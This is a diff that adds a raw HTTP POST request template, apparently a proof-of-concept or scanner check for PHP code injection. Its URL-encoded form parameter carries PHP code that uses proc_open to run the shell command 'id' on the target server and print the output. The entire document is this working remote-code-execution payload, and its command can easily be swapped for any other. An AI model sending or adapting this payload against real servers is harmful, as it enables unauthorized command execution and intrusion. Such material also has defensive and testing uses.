@@ -1,0 +1,6 @@
+POST {script_path} HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 364
+Connection: close
+
+a=%24cmd%3D%22id%22%3B%24descriptorspec%3Darray%280%3D%3Earray%28%22pipe%22%2C%22r%22%29%2C1%3D%3Earray%28%22pipe%22%2C%20%22w%22%29%2C2%3D%3Earray%28%22pipe%22%2C%20%22w%22%29%29%3B%24proc%3Dproc%5Fopen%28%24cmd%2C%20%24descriptorspec%2C%20%24pipes%29%3Bwhile%28%21feof%28%24pipes%5B1%5D%29%29%7Bprint%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3Bflush%28%29%3B%7D
